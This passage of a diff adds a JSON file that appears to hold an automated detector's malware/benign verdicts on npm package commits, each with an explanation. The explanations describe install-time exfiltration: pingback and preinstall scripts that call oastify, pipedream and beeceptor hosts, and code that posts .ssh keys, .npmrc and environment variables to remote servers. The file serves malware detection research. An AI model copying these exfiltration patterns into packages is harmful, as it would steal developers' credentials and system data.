+    "explanation": "**At line None file package.json**:\nCode: `pingback script making HTTP request to https://eo536ohsnextro9.m.pipedream.net`\nReason: The 'pingback' script is making an HTTP request to an external server, potentially exfiltrating data or establishing a backchannel, which is a common trait of malware.\n\n**At line None file package.json**:\nCode: `presence of 'wallet-icons' and mentions of 'Bitcoin'`\nReason: The presence of 'wallet-icons' and mentions of 'Bitcoin' may indicate involvement with cryptocurrency operations, potentially introducing risks related to wallet management or unauthorized transactions, which could be malicious.\n\n**Summary:** The commit contains a CRITICAL issue related to suspicious network access and a MEDIUM issue related to crypto activities, indicating potential malware behavior. Although the dynamic analysis did not yield any results, the static analysis findings are significant enough to classify the commit as malware."
+  },
+  {
+    "hash": "0d0cb779e65f537a9a4503c2902c5991aa8b1eeb",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file index.js**:\nCode: `N/A`\nReason: Sending sensitive system information to an external server via a POST request, indicating potential data exfiltration.\n\n**At line N/A file package.json**:\nCode: `N/A`\nReason: The 'pingback' script is making a curl request to an external server, which could be used for tracking or data exfiltration.\n\n**Summary:** The commit contains code that is sending sensitive system information to external servers and making suspicious network requests, indicating malicious activity."
+  },
+  {
+    "hash": "14fb839e177ca1e9a8f6c1ec46f091efcbbb27c6",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file index.js**:\nCode: `N/A`\nReason: Sending sensitive system information to 'exzuperi.ftp.sh' via HTTPS GET request, indicating potential data exfiltration.\n\n**At line N/A file package.json**:\nCode: `N/A`\nReason: Making an HTTP request to a suspicious URL 'https://eo536ohsnextro9.m.pipedream.net' via 'pingback' script, suggesting potential malicious activity.\n\n**At line N/A file index.js**:\nCode: `N/A`\nReason: Leaking sensitive system information by sending it to an external server, a clear indication of malicious behavior.\n\n**Summary:** The commit contains critical issues related to suspicious network access and data leaks, indicating malicious intent. The static analysis revealed multiple critical and high-severity issues, including sending sensitive system information to external servers and making requests to suspicious URLs. Although the dynamic analysis did not provide additional insights, the static analysis findings are sufficient to classify the commit as malware."
+  },
+  {
+    "hash": "f31f195caa862e9608d7bcfd787bda0819f15b39",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "bd256296dc3beab8af90c3ce3888a06b3330ed87",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "fe2ca0bb33f349d74560562073e635038ec6245c",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "df017ad3353598ca23b8a20af3a7e5ab14139f88",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating the commit is likely benign."
+  },
+  {
+    "hash": "35b8a7e8d997ce588bc6fdd778e370295127294e",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `'preinstall' script making an HTTP request to 'https://bes23.free.beeceptor.com'`\nReason: Suspicious network access to a potentially malicious endpoint\n\n**At line None file package.json**:\nCode: `'pingback' script making an HTTP request to 'https://eo536ohsnextro9.m.pipedream.net'`\nReason: Suspicious network access to a potentially malicious endpoint\n\n**At line None file index.js**:\nCode: `Sending sensitive system information to '356sv2lpkjygtxa2jimze3fvrmxdl59u.oastify.com'`\nReason: Significant data leak of sensitive system information\n\n**At line None file index.js**:\nCode: `Making a POST request to '356sv2lpkjygtxa2jimze3fvrmxdl59u.oastify.com'`\nReason: Suspicious network access for potential data exfiltration\n\n**Summary:** The commit contains multiple critical and high-severity issues related to suspicious network access and data leaks, indicating malicious behavior."
+  },
+  {
+    "hash": "ae887ff8747f5901674b6fa18eb3e67d65029050",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nReason: The code is sending sensitive device information to an external server via an HTTPS GET request, indicating potential data exfiltration.\n\n**At line None file index.js**:\nReason: The code collects and transmits sensitive device information, including network interfaces and user information, to an external server, which is a malicious behavior.\n\n**Summary:** The commit is classified as malware due to its suspicious behavior of collecting and transmitting sensitive device information to an external server, indicating a potential data exfiltration attempt."
+  },
+  {
+    "hash": "7e2a772c30d1c06812db83545d36fda718b9cf47",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nReason: The code is sending a POST request to a suspicious domain with sensitive system information, indicating potential data exfiltration.\n\n**At line None file index.js**:\nReason: The code is leaking sensitive system information such as homedir, hostname, username, and DNS servers, which is a serious security risk.\n\n**Summary:** The static analysis revealed critical issues related to suspicious network access and data leaks, indicating that the commit is malicious."
+  },
+  {
+    "hash": "43e9f03177e902129d588551a105cf1d76d0fc32",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line not specified file middleware.js**:\nCode: `jwt.verify() with user-controlled input (req.query.prof)`\nReason: Potential code injection or authentication bypass due to lack of validation on user-controlled input.\n\n**At line not specified file middleware.js**:\nCode: `HTTP request to https://Authenticator.wizcloud.co.il/api/publicKey`\nReason: Potential data exfiltration vector or malicious endpoint.\n\n**At line not specified file middleware.js**:\nCode: `authrizedCallbakcURL variable`\nReason: Not properly initialized or validated, potentially leading to unexpected behavior or security vulnerabilities.\n\n**Summary:** The commit contains critical and high-severity issues, including potential code injection, suspicious network access, and unsafe environment variables, indicating malicious intent."
+  },
+  {
+    "hash": "14c840f34b22728d1cb9a1c9f68f71a3b28cdd31",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "c90e59edfe37ae2765c0a5dabc7d900243579f1c",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file lib/rules/cf-env.js**:\nReason: The code has issues related to unsafe environment variables and suspicious network access, but these are not indicative of malware. They are more related to potential misconfigurations or lack of validation.\n\n**At line None file lib/rules/cf-url.js**:\nReason: The regular expression used for URL matching may not be comprehensive, but this is a low-severity issue and not necessarily indicative of malware.\n\n**Summary:** The static analysis revealed some potential security issues, but they are not severe enough to classify the commit as malware. The dynamic analysis did not find any malicious behavior. Overall, the commit appears to be benign."
+  },
+  {
+    "hash": "6299bde497cc9630e8da2434586dbb3f5b8ebf29",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating the commit is likely benign."
+  },
+  {
+    "hash": "a561ea17e821975be3ff006af427351f7d674fe5",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating the commit is likely benign."
+  },
+  {
+    "hash": "0e83ed5c3066d4df57becab2bc5cac1c14436f35",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nCode: `HTTPS POST request to 3gkh14fx7bklydza2ir4kd18ozuuim6b.oastify.com`\nReason: The request is made to a suspicious domain, indicating potential data exfiltration or malicious activity.\n\n**At line None file index.js**:\nCode: `Collecting and sending sensitive system information`\nReason: Sending sensitive information like homedir, hostname, username, and dns servers to an external server is a significant security risk and indicative of malware.\n\n**Summary:** The commit is classified as malware due to its suspicious network activity and data exfiltration of sensitive system information, as identified by the static analysis."
+  },
+  {
+    "hash": "2d6dc83b429ebb1e2f1ac0c733f03c9eb3ea0ab0",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line not available file index.js**:\nCode: `https://35fg3v0vbpoqnai5xtxd16l9t.canarytokens.com`\nReason: The URL is a canary token, which is a tracking mechanism used to detect or trigger a response. While it is suspicious, its presence alone does not necessarily indicate malware; it could be used for legitimate security testing or monitoring.\n\n**Summary:** The static analysis raised critical issues due to the presence of a canary token URL, which is not inherently malicious but rather a tool for detecting potential security issues. The dynamic analysis did not reveal any malicious behavior. Given the context, the commit is likely benign, possibly related to security testing or monitoring."
+  },
+  {
+    "hash": "a7aff4aa9c15cb73ea65f0ae593de6b7e630d5fb",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `https://games4ustodays.fun/roblox.html`\nReason: The presence of a suspicious URL in the commit is a strong indicator of potential malware. The URL is not a legitimate or well-known site, and its presence in the package.json file could be used to download or execute malicious code.\n\n**At line None file package.json**:\nCode: `new script '1234567'`\nReason: While the severity is marked as LOW, the addition of a new script that executes a command could be used for unintended command execution if not properly controlled. However, this is overshadowed by the critical issue related to the suspicious URL.\n\n**Summary:** The commit is classified as malware due to the presence of a suspicious URL in the package.json file, which poses a significant security risk. Although the dynamic analysis did not yield any results, the static analysis revealed a critical issue that cannot be ignored."
+  },
+  {
+    "hash": "33c855b09d8ca33fab33e9a17a714c9c25ca1088",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file package.json**:\nCode: `addition of 'puppeteer' dependency`\nReason: Although 'puppeteer' can be used for malicious activities, its presence alone is not conclusive evidence of malware. It is a legitimate dependency that can be used for various purposes including testing and automation.\n\n**At line None file package.json**:\nCode: `'1234567' script`\nReason: The '1234567' script seems unusual and could be a sign of obfuscation or a placeholder. However, the dynamic analysis did not reveal any malicious activity, and the static analysis indicates that the command executed by this script seems benign.\n\n**Summary:** The static analysis raised some concerns regarding the 'puppeteer' dependency and the '1234567' script. However, the dynamic analysis did not detect any malicious behavior, and the code changes do not appear to be executing any harmful commands. The issues identified can be attributed to unusual coding practices rather than malware."
+  },
+  {
+    "hash": "8f47d451e7ce5bde5ed45ff598d4b12eb86abc3c",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file package.json**:\nReason: The 'pingback' script makes an HTTP request to a potentially unknown or suspicious endpoint, but without further context or evidence of malicious behavior, this alone is not conclusive of malware.\n\n**Summary:** The static analysis raised a medium severity issue regarding a 'pingback' script making an HTTP request to a potentially unknown endpoint. However, the dynamic analysis did not reveal any malicious behavior. Without concrete evidence of malicious activity, the commit is considered benign."
+  },
+  {
+    "hash": "54f39708bc9f138ea82e72012e66f536a7735f55",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line not specified file index.js**:\nCode: `POST request to https://envparam.free.beeceptor.com with environment variables`\nReason: Sending sensitive environment variables to an external URL is a potential security risk, as it could expose sensitive data.\n\n**At line not specified file index.js**:\nCode: `Logging environment variables to the console`\nReason: Logging sensitive data, such as environment variables, can expose it to unauthorized parties.\n\n**At line not specified file index.js**:\nCode: `Loading environment variables from .env file using dotenv.config().parsed`\nReason: If not handled carefully, loading environment variables from a .env file can expose sensitive data.\n\n**Summary:** The commit is flagged as malware due to its suspicious behavior of sending sensitive environment variables to an external URL and logging them to the console, potentially exposing sensitive data."
+  },
+  {
+    "hash": "3b1ce60b39202e129a4c42e98f883fff5ea66f4c",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line unknown file package.json**:\nCode: `pingback script making HTTP request to https://eo536ohsnextro9.m.pipedream.net`\nReason: The 'pingback' script makes an HTTP request to an external server, which could be used for data exfiltration or other malicious activities.\n\n**Summary:** The static analysis revealed a critical issue with a 'pingback' script in package.json making an HTTP request to an external server, indicating potential malware behavior."
+  },
+  {
+    "hash": "082bc95d936a69672c3fb9c4b77ef3f705f63f91",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nReason: Making an unexpected HTTP request to a potentially malicious domain is a strong indicator of malicious activity.\n\n**At line None file package.json**:\nReason: The 'pingback' script is making an HTTP request to a potentially malicious domain, which is suspicious behavior.\n\n**At line None file package.json**:\nReason: Running 'index.js' in the 'preinstall' script may lead to arbitrary code execution, indicating potential malware.\n\n**Summary:** The static analysis revealed multiple critical and high-severity issues related to suspicious network access and potential arbitrary code execution, indicating that the commit is likely to be malware. Although the dynamic analysis did not provide additional insights, the static analysis findings are sufficient to conclude that the commit is malicious."
+  },
+  {
+    "hash": "721cb1cd5d075b15291f0b01fd89f1042cad148c",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `pingback script`\nReason: The 'pingback' script makes an HTTP request to an external server, potentially exfiltrating data or establishing a backdoor.\n\n**Summary:** The static analysis revealed a critical issue with the 'pingback' script in package.json, indicating potential data exfiltration or backdoor establishment, which is a characteristic of malware."
+  },
+  {
+    "hash": "38c22462b1f35cd00a6b9f5bc7becbc201dd0eb2",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `'pingback' script making an HTTP request to https://eo536ohsnextro9.m.pipedream.net`\nReason: Suspicious network access to an external URL potentially indicating data exfiltration or a callback to a command and control server.\n\n**At line None file index.js**:\nCode: `POST request to en47d1uz958z2v9.m.pipedream.net with system information`\nReason: Sends potentially sensitive system information to an external server, indicating potential data exfiltration.\n\n**At line None file index.js**:\nCode: `Collects and sends system information (homedir, hostname, username, dns servers)`\nReason: Data leaks of potentially sensitive system information to an external server without proper justification or anonymization.\n\n**Summary:** The commit is classified as malware due to evidence of suspicious network access, data exfiltration, and potential command and control communication. The static analysis revealed critical issues related to external HTTP requests and data leaks, while the dynamic analysis confirmed unexpected outbound connections, reinforcing the verdict."
+  },
+  {
+    "hash": "b21f8225909a39cf00643da92c1339f51d3db384",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file tracker.js**:\nReason: The code reads sensitive files (.npmrc, .bash_history, .ssh/id_rsa, .ssh/id_rsa.pub) and sends their contents to a remote server, indicating a data leak.\n\n**At line None file tracker.js**:\nReason: The code makes a POST request to a suspicious URL (https://b.alt-h7-eoj8gqk1.workers.dev/track) with potentially sensitive data, indicating suspicious network access.\n\n**At line None file tracker.js**:\nReason: The code accesses and sends all environment variables (process.env) to a remote server, which is an unsafe practice.\n\n**At line None file package.json**:\nReason: The postinstall script runs 'node index.js', which could potentially execute malicious code.\n\n**Summary:** The commit is classified as malware due to multiple critical and high-severity issues identified in the static and dynamic analysis, including data leaks, suspicious network access, and potential command execution."
+  },
+  {
+    "hash": "82fde081fe8a4cbdbb5a5590933c404f4c36ddf8",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file like.sh**:\nCode: `curl command to a suspicious domain`\nReason: The script makes an HTTP request to a suspicious domain, potentially exfiltrating sensitive data.\n\n**At line None file like.sh**:\nCode: `leaking sensitive information`\nReason: The script is leaking sensitive information such as the contents of the home directory, hostname, current working directory, username, and IP address.\n\n**At line None file package.json**:\nCode: `'pingback' script`\nReason: The 'pingback' script makes an HTTP request to a suspicious domain, indicating potential malicious activity.\n\n**At line None file package.json**:\nCode: `'preinstall' script running 'like.sh'`\nReason: The 'preinstall' script runs a potentially untrusted script 'like.sh', which has been identified as malicious.\n\n**At line None file None**:\nCode: `outbound connection to 20.205.243.165:443`\nReason: Dynamic analysis detected an unexpected outbound connection destination, indicating potential data exfiltration or command and control communication.\n\n**Summary:** The commit is classified as malware due to multiple indicators of malicious activity, including suspicious network access, data leaks, and unexpected outbound connections. The static analysis identified critical issues in the 'like.sh' script and 'package.json' file, while the dynamic analysis detected an unexpected outbound connection, collectively indicating a malicious intent."
+  },
+  {
+    "hash": "ec841458875c5a8906077c4afc2ae03de0d93270",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file commit ec841458875c5a8906077c4afc2ae03de0d93270**:\nCode: `node /usr/local/bin/npm install --unsafe-perm`\nReason: The command 'npm install --unsafe-perm' is executed, which can potentially run arbitrary scripts. The connection to an external IP (20.205.243.165:443) is flagged as 'Disallowed outbound connection destination', indicating suspicious activity.\n\n**Summary:** The dynamic analysis reveals a suspicious outbound connection from a container running 'maldep' image, which is triggered by the 'npm install --unsafe-perm' command. This behavior is indicative of potential malware activity, as it involves unexpected network connections and potentially risky command execution."
+  },
+  {
+    "hash": "c4f7da55e48053e92ccfd01df7efdbbfb0a29021",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `https://ymoigeimqskztw0s4v35pdmnve15pvdk.oastify.com and https://eo536ohsnextro9.m.pipedream.net`\nReason: These URLs are flagged as suspicious due to their seemingly random domain names, which is a common trait of malware command and control servers or data exfiltration endpoints.\n\n**At line None file lib/FragmentResolver.js and lib/es/FragmentResolver.js**:\nCode: `process.env.NODE_ENV`\nReason: Direct access to environment variables can be risky if not properly sanitized, as it may lead to information disclosure or other security issues.\n\n**At line None file npm install --unsafe-perm**:\nCode: `node /usr/local/bin/npm install --unsafe-perm`\nReason: The use of '--unsafe-perm' with npm install can potentially allow the execution of arbitrary code with elevated privileges, which is a significant security risk.\n\n**Summary:** The commit is classified as malware due to the presence of suspicious network accesses to potentially malicious URLs, unsafe handling of environment variables, and the use of '--unsafe-perm' during npm installation, which collectively indicate a high risk of malicious activity."
+  },
+  {
+    "hash": "fa7dbef6015745e241986d13348b5dc06459b1a6",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line unknown file index.js**:\nCode: `sending POST request to 'eagfwqhnuidzdcsrlkql04adqquruy8jf.oast.fun'`\nReason: The domain 'eagfwqhnuidzdcsrlkql04adqquruy8jf.oast.fun' is suspicious and the request is sending sensitive system information.\n\n**At line unknown file index.js**:\nCode: `collecting and sending system information (homedir, hostname, username, network interfaces)`\nReason: This behavior is indicative of malware as it involves unauthorized collection and exfiltration of sensitive system data.\n\n**At line unknown file unknown**:\nCode: `node /usr/local/bin/npm install --unsafe-perm`\nReason: The dynamic analysis shows a command being executed with '--unsafe-perm' which can be a security risk as it allows the execution of arbitrary code during npm install.\n\n**Summary:** The commit is identified as malware due to its suspicious network activity, collection and exfiltration of sensitive system information, and potentially risky command execution during npm install."
+  },
+  {
+    "hash": "258d1838e2ae0d942839e20bd5064af0aca8aabe",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line Unknown file Unknown**:\nCode: `Suspicious network access to https://ymoigeimqskztw0s4v35pdmnve15pvdk.oastify.com`\nReason: The domain appears to be randomly generated, which is a common trait of malware command and control (C2) servers.\n\n**At line Unknown file Unknown**:\nCode: `Potential code injection vulnerability using 'eval' function`\nReason: The use of 'eval' with potentially untrusted input can lead to code injection attacks, a common technique used by malware.\n\n**At line Unknown file Unknown**:\nCode: `node /usr/local/bin/npm install --unsafe-perm`\nReason: The use of '--unsafe-perm' with npm install can lead to security vulnerabilities as it allows the package to run with elevated privileges.\n\n**At line Unknown file Unknown**:\nCode: `Disallowed outbound connection destination (connection=172.17.0.2:38414->20.205.243.165:443)`\nReason: The container is making an unexpected outbound connection to a potentially malicious destination.\n\n**Summary:** The commit is flagged as malware due to multiple indicators of potentially malicious activity, including suspicious network access, potential code injection, and unexpected outbound connections. These behaviors are commonly associated with malware."
+  },
+  {
+    "hash": "37f1f83abf599438417889fa15970294e38f8cf1",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file commit 37f1f83abf599438417889fa15970294e38f8cf1**:\nCode: `node /usr/local/bin/npm install --unsafe-perm`\nReason: The use of '--unsafe-perm' with npm install can potentially allow arbitrary code execution, and when combined with an unexpected outbound connection, it raises significant security concerns.\n\n**At line None file commit 37f1f83abf599438417889fa15970294e38f8cf1**:\nCode: `172.17.0.2:38418->20.205.243.165:443`\nReason: The dynamic analysis revealed an unexpected outbound connection to 20.205.243.165:443, which is a red flag indicating potential malware communication.\n\n**Summary:** The dynamic analysis indicates a suspicious outbound connection during the execution of 'npm install --unsafe-perm', suggesting potential malware activity. The static analysis did not reveal any issues, but the dynamic analysis findings outweigh the static analysis results, leading to a verdict of malware."
+  },
+  {
+    "hash": "3c6f1d05593966a7b4d3e9973e31e6fa08fc9717",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `preinstall script making HTTP request to https://ymoigeimqskztw0s4v35pdmnve15pvdk.oastify.com`\nReason: The 'preinstall' script is making a request to a suspicious domain, indicating potential data exfiltration or backdoor activity.\n\n**At line None file index.js**:\nCode: `POST request to https://ymoigeimqskztw0s4v35pdmnve15pvdk.oastify.com`\nReason: The code is making a POST request to a suspicious domain, which could be a sign of malicious activity or data exfiltration.\n\n**At line None file None**:\nCode: `Unexpected outbound connection destination (command=node /usr/local/bin/npm install --unsafe-perm connection=172.17.0.2:38422->20.205.243.165:443 user=root container_id=6eab252bb68b container_name=som`\nReason: Dynamic analysis detected an unexpected outbound connection during 'npm install', suggesting potential malicious activity.\n\n**Summary:** The commit is classified as malware due to the presence of suspicious network requests to unknown domains in both static and dynamic analyses, indicating potential data exfiltration or backdoor activity."
+  },
+  {
+    "hash": "7bdce9375fc512db8da0893c6471afce12c6c423",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file src/ebnf-parser.js**:\nCode: `parse function`\nReason: The `parse` function generated by jison may be vulnerable to code injection attacks if not properly sanitized, indicating a potential security risk.\n\n**At line None file package.json**:\nCode: `railroad-diagrams dependency`\nReason: Fetching the `railroad-diagrams` dependency from a specific GitHub commit may indicate a potential security risk if the repository is compromised.\n\n**At line None file None**:\nCode: `node /usr/local/bin/npm install --unsafe-perm`\nReason: The dynamic analysis detected an unexpected outbound connection during the execution of `npm install --unsafe-perm`, which is a suspicious behavior.\n\n**Summary:** The commit is flagged as malware due to the presence of a potentially vulnerable `parse` function, a suspicious dependency fetch, and an unexpected outbound network connection during dynamic analysis, collectively indicating a potential security risk."
+  },
+  {
+    "hash": "4298a4f4399d3d004c585c83110903113776d62b",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `pingback script making HTTP request to https://eo536ohsnextro9.m.pipedream.net`\nReason: Potential data exfiltration or establishment of a callback channel\n\n**At line None file index.js**:\nCode: `POST request to cfhkr5pjas2slrrhp4s0pruu5eat15gkz.oast.live on port 443`\nReason: Potential data exfiltration\n\n**At line None file package.json**:\nCode: `preinstall script executing 'node index.js'`\nReason: Potential execution of untrusted code\n\n**Summary:** The commit contains multiple critical and high-severity issues indicating potential malware behavior, including data exfiltration and execution of untrusted code."
+  },
+  {
+    "hash": "60b761cc117ce6860b54686c15b81af43d52add3",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `preinstall script making HTTP request to https://bes23.free.beeceptor.com`\nReason: The request to an external URL during preinstall could be used for data exfiltration or fetching malicious content.\n\n**At line None file package.json**:\nCode: `pingback script making HTTP request to https://eo536ohsnextro9.m.pipedream.net`\nReason: The pingback script's HTTP request could be used for data exfiltration or signaling external entities.\n\n**At line None file index.js**:\nCode: `POST request to 356sv2lpkjygtxa2jimze3fvrmxdl59u.oastify.com`\nReason: The POST request to a suspicious hostname could be used for data exfiltration.\n\n**Summary:** The commit is flagged as malware due to multiple critical issues related to suspicious network access in the static analysis, indicating potential data exfiltration or malicious activity."
+  },
+  {
+    "hash": "fbf9cb99b29878b0e1838e75fdb1ae07d5ce5307",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating that the commit is likely benign."
+  },
+  {
+    "hash": "d8a375ea0422cb2e4ea07a8ec56aeeedbdd3552e",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nReason: Sending sensitive system information to an external server via HTTPS POST request is a strong indicator of malicious activity.\n\n**At line None file index.js**:\nReason: Collecting and sending sensitive system information such as homedir, hostname, username, and DNS servers without proper anonymization and user consent is suspicious.\n\n**At line None file package.json**:\nReason: The 'pingback' script making an HTTP request to an external server could be used for malicious purposes or to exfiltrate data.\n\n**Summary:** The commit is flagged as malware due to its behavior of sending sensitive system information to external servers and making suspicious network requests, indicating potential data exfiltration or malicious communication."
+  },
+  {
+    "hash": "a51584de6b3e9bcc498bdc6fab57d9d05dea6880",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file package.json**:\nCode: `preinstall script making HTTP request to qodwrrsrlzhsulruailbd2gpoi7dk38wz.oast.fun`\nReason: The domain appears to be suspicious and is exfiltrating sensitive system information.\n\n**At line N/A file package.json**:\nCode: `pingback script making HTTP request to eo536ohsnextro9.m.pipedream.net`\nReason: The domain is suspicious and could be used for malicious purposes such as pingback or callback.\n\n**At line N/A file package.json**:\nCode: `child_process.execSync used with system commands`\nReason: Potential command execution vulnerability if input is not properly sanitized.\n\n**Summary:** The commit contains critical issues related to suspicious network access and potential command execution, indicating malicious behavior."
+  },
+  {
+    "hash": "d0542fee9b5d17da080e3992dd8afe31667289f9",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `http://v845u9t1gtbc7bkdsf1soeqyup0goacz.oastify.com`\nReason: The presence of a suspicious external server link in package.json suggests potential malicious activity, as it is not a standard or expected dependency for the project.\n\n**At line None file package.json**:\nCode: `https://shurll.com/2tiFZ5`\nReason: The external link in the commit message could be indicative of data exfiltration or other suspicious activity, warranting further investigation.\n\n**Summary:** The commit contains suspicious network accesses and potential data exfiltration indicators, suggesting malicious intent."
+  },
+  {
+    "hash": "f78cd51d6b577a41be960804898f02637b60d475",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nCode: `child_process.exec()`\nReason: The use of 'child_process.exec()' with user-controlled input is a serious security risk as it allows for command execution.\n\n**At line None file index.js**:\nCode: `axios.post('http://v845u9t1gtbc7bkdsf1soeqyup0goacz.oastify.com')`\nReason: Sending sensitive data to an external URL is suspicious and potentially malicious.\n\n**At line None file package.json**:\nCode: `'preinstall' script making HTTPS requests to 'https://qodwrrsrlzhsulruailbd2gpoi7dk38wz.oast.fun?'`\nReason: The 'preinstall' script is exfiltrating encoded system information, which is a strong indicator of malware.\n\n**Summary:** The commit contains multiple critical and high-severity issues, including command execution with user-controlled input, sending sensitive data to external URLs, and exfiltrating system information. These behaviors are characteristic of malware."
+  },
+  {
+    "hash": "fbb9352377771d652ebdf8613f565e0905369614",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `preinstall script making HTTPS request to https://qodwrrsrlzhsulruailbd2gpoi7dk38wz.oast.fun?`\nReason: The 'preinstall' script is making a potentially malicious HTTPS request to a suspicious domain with encoded system information, indicating possible data exfiltration or backdoor activity.\n\n**At line None file package.json**:\nCode: `child_process.execSync used to execute 'uname -a' and 'cat /etc/hostname'`\nReason: The use of 'child_process.execSync' to execute system commands is potentially dangerous as it can be used to gather system information or execute malicious commands.\n\n**At line None file package.json**:\nCode: `pingback script making curl request to https://eo536ohsnextro9.m.pipedream.net`\nReason: The 'pingback' script is making a request to a potentially suspicious domain, which could be a signal to an external command and control server.\n\n**Summary:** The commit is classified as malware due to the presence of a 'preinstall' script that exfiltrates system information to a suspicious domain and executes potentially malicious system commands. Additionally, the 'pingback' script communicates with a potentially suspicious domain, further indicating malicious activity."
+  },
+  {
+    "hash": "d08a97a9cfc666a8d7a8d1bcb596bc9ca6275996",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating the commit is likely benign."
+  },
+  {
+    "hash": "a9fc9e3abcfc5d88903265c3d729d6b815319140",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line unknown file package.json**:\nCode: `pingback script`\nReason: The 'pingback' script makes an unexpected HTTP request to an external server, potentially exfiltrating data or establishing a backdoor communication channel.\n\n**Summary:** The static analysis revealed a critical issue with a 'pingback' script making an unexpected HTTP request to an external server, indicating potential malware behavior. Although the dynamic analysis did not yield any results, the static analysis findings are sufficient to classify the commit as malware."
+  },
+  {
+    "hash": "82b251ea449338ab7c8b2f507d002b15c9b74a8b",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line not available file index.js**:\nCode: `curl to an external IP and nslookup with dynamically generated data`\nReason: The use of 'exec' with untrusted or dynamically generated commands can lead to command injection attacks.\n\n**At line not available file index.js**:\nCode: `HTTP request to https://211.205.15.43`\nReason: The request to a suspicious IP address could potentially exfiltrate sensitive information.\n\n**At line not available file package.json**:\nCode: `'pingback' script making a curl request to https://eo536ohsnextro9.m.pipedream.net`\nReason: This could be a callback or data exfiltration endpoint.\n\n**Summary:** The commit contains critical and high-severity issues related to command execution and suspicious network access, indicating potential malware behavior."
+  },
+  {
+    "hash": "cc8a240726fb7a9cfbf46f520369ba47fca641b7",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file install.js**:\nReason: Sending sensitive system information to an external server via a POST request, which is a clear indication of malicious activity.\n\n**At line None file package.json**:\nReason: The 'pingback' script makes a curl request to a suspicious external URL, indicating potential data exfiltration or malicious communication.\n\n**Summary:** The commit is classified as malware due to the presence of critical and high-severity issues in the static analysis, including sending sensitive system information to external servers and making suspicious network requests."
+  },
+  {
+    "hash": "3493b528eb195e85b0c4bde3e8884f552086e2ad",
+    "sample_folder": "mongoose",
+    "predict": "malware",
